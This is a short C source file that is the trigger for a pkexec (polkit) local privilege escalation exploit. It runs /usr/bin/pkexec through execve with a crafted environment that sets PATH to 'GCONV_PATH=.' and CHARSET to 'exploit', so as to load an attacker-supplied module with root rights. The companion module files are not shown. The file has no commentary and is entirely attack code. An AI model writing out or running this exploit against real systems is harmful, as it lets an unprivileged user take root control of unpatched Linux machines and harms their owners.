#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char * const args[] = { "pkexec", NULL };
char * const envp[] = {
    "exploit",
    "PATH=GCONV_PATH=.",
    "CHARSET=exploit",
    "SHELL=exploit",
    "GIO_USE_VFS=",
    NULL
};

int main(void) {
    execve("/usr/bin/pkexec", args, envp);
    return 0;
}
